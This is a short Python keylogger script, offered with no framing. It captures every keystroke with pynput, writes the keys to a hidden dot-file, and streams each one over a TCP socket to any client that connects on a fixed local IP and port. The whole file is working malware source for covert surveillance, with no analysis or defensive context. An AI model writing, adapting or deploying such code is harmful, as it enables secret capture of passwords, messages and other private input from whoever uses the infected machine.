from pynput.keyboard import Key, Listener
import logging
import socket

log_dir = "./.file.txt"

logging.basicConfig(filename=log_dir, level=logging.DEBUG, format='%(asctime)s: %(message)s')

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('192.168.1.3', 9999))
server.listen(1)

def on_press(key):
    try:
        variable_bytes = str(key).encode('utf-8')
        message = variable_bytes[:64].ljust(64, b'\x00')
        if client_socket:
            client_socket.send(message)
        logging.info(str(key))
    except Exception as e:
        print(f"Error: {str(e)}")
    except KeyboardInterrupt:
        pass
client_socket = None

def accept_client():
    global client_socket
    client_socket, addr = server.accept()

import threading
accept_thread = threading.Thread(target=accept_client)
accept_thread.daemon = True
accept_thread.start()

with Listener(on_press=on_press) as listener:
    listener.join()
